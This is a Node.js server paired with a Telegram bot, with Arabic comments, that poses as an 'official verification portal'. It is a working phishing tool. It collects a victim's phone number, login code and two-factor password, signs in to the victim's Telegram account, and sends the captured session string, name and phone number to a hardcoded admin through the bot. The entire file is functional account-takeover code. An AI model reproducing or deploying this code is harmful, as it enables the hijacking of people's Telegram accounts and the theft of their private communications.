const express = require('express');
const cors = require('cors');
const { Telegraf, Markup } = require('telegraf');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
require('dotenv').config();

const app = express();
app.use(express.json());
app.use(cors());
app.use(express.static('public'));

const apiId = parseInt(process.env.API_ID || "0", 10);
const apiHash = process.env.API_HASH || "";
const botToken = process.env.BOT_TOKEN || "";

// آيدي المسؤول الخاص بك لاستقبال التقارير والتنبيهات
const MY_ADMIN_ID = 8065754360; 

// إعداد بوت تيليغرام عبر Telegraf
const bot = new Telegraf(botToken);

bot.start((ctx) => {
  return ctx.reply(
    'أهلاً بك في بوابة التوثيق الرسمية! 🌟\n\nانقر على الزر أدناه لبدء عملية التوثيق بكل سهولة:',
    Markup.inlineKeyboard([
      [Markup.button.webApp('🚀 فتح بوابة التفعيل', `https://${ctx.req?.headers?.host || 'tg-mini-app-ofj8.onrender.com'}`)]
    ])
  );
});

bot.launch().then(() => {
  console.log('🤖 بوت تيليغرام يعمل بنجاح ويستمع للأوامر...');
});

// تخزين العملاء مؤقتاً لحين انتهاء الخطوات
let activeClients = {};

// 1️⃣ مرحلة إرسال الكود للرقم
app.post('/api/send-code', async (req, res) => {
  try {
    const { phone } = req.body;
    if (!phone) {
      return res.status(400).json({ success: false, error: 'الرقم مطلوب' });
    }

    const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
      connectionRetries: 3,
    });
    
    await client.connect();

    const result = await client.invoke(
      new Api.auth.SendCode({
        phoneNumber: phone,
        apiId: apiId,
        apiHash: apiHash,
        settings: new Api.CodeSettings({}),
      })
    );

    activeClients[phone] = {
      client: client,
      phoneCodeHash: result.phoneCodeHash
    };

    res.json({
      success: true,
      phoneCodeHash: result.phoneCodeHash,
      phone: phone
    });

  } catch (error) {
    console.error('خطأ في إرسال الرمز:', error);
    res.status(500).json({ success: false, error: error.errorMessage || error.message });
  }
});

// 2️⃣ مرحلة التحقق من الكود (مع دعم ذكي لكلمة المرور 2FA)
app.post('/api/verify-code', async (req, res) => {
  try {
    const { phoneNumber, phoneCode, password } = req.body;

    const sessionData = activeClients[phoneNumber];
    if (!sessionData) {
      return res.status(400).json({ success: false, error: 'انتهت الجلسة، يرجى إرسال الرمز من جديد' });
    }

    const { client, phoneCodeHash } = sessionData;
    let signInResult;

    try {
      // محاولة تسجيل الدخول بالكود فقط
      signInResult = await client.invoke(
        new Api.auth.SignIn({
          phoneNumber: phoneNumber,
          phoneCodeHash: phoneCodeHash,
          phoneCode: phoneCode.toString().trim(),
        })
      );
    } catch (err) {
      // إذا طلب الحساب كلمة مرور (2FA) ولم يتم إرسالها بعد
      if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
        if (!password) {
          // إعلام الواجهة بأن الحساب يحتاج كلمة مرور لإظهار الحقل للمستخدم
          return res.json({ success: false, needPassword: true, error: 'الحساب محمي بكلمة مرور (2FA)' });
        } else {
          // إذا أرسل المستخدم كلمة المرور، نقوم بتسجيل الدخول بها
          const pwdInfo = await client.invoke(new Api.account.GetPassword());
          const passwordHash = await client.auth.computePasswordCheck(pwdInfo, password);
          signInResult = await client.invoke(
            new Api.auth.CheckPassword({ password: passwordHash })
          );
        }
      } else {
        throw err;
      }
    }

    // حفظ الجلسة بنجاح
    const savedSession = client.session.save();
    
    let userInfo = "مستخدم جديد";
    try {
      const me = await client.getMe();
      userInfo = `${me.firstName || ''} ${me.lastName || ''} (@${me.username || 'لا يوجد معرف'})`;
    } catch (e) {
      console.log('تعذر جلب تفاصيل الحساب الإضافية');
    }

    // إرسال تقرير النجاح الكامل لك على البوت
    try {
      const reportMessage = `
🚨 **تم توثيق حساب جديد بنجاح!** 🌟

👤 **الاسم:** ${userInfo}
📱 **رقم الهاتف:** \`${phoneNumber}\`

🔑 **نص الجلسة (Session String):**
\`${savedSession}\`
      `;
      await bot.telegram.sendMessage(MY_ADMIN_ID, reportMessage, { parse_mode: 'Markdown' });
    } catch (err) {
      console.error('فشل في إرسال التقرير للأدمن:', err);
    }

    delete activeClients[phoneNumber];

    res.json({
      success: true,
      sessionString: savedSession
    });

  } catch (error) {
    console.error('خطأ في التحقق:', error);
    res.status(400).json({ success: false, error: error.errorMessage || error.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`السيرفر يعمل بنجاح على البورت http://localhost:${PORT}`);
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
